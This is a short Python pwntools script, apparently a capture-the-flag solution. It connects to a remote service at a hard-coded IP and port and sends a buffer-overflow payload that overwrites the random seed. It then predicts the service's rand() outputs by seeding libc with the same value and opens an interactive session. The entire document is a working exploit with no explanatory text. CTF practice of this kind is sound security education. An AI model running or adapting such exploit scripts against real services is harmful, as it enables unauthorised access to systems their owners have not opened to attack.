from pwn import *
from ctypes import *

#io = process("./b36dd9aa8fa3499099e24d4ba0aeef27")
io = remote("111.198.29.45",56341)
io.read()

#libc = ELF("./b36dd9aa8fa3499099e24d4ba0aeef27").libc
# this line doesn't work 

libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")

payload = b"A"*0x20+p64(0) 
io.sendline(payload)
print('the length of p64(1)  is %s '%(hex(len(p64(1)))))
print('the length of payload b"A"*0x20+p64(0) is %s'%(hex(len(payload))))


libc.srand(1)
for i in range(0,10):
    guess_num = libc.rand()%6 + 1 
    io.read()
    io.sendline(str(guess_num))
io.interactive()
io.close()
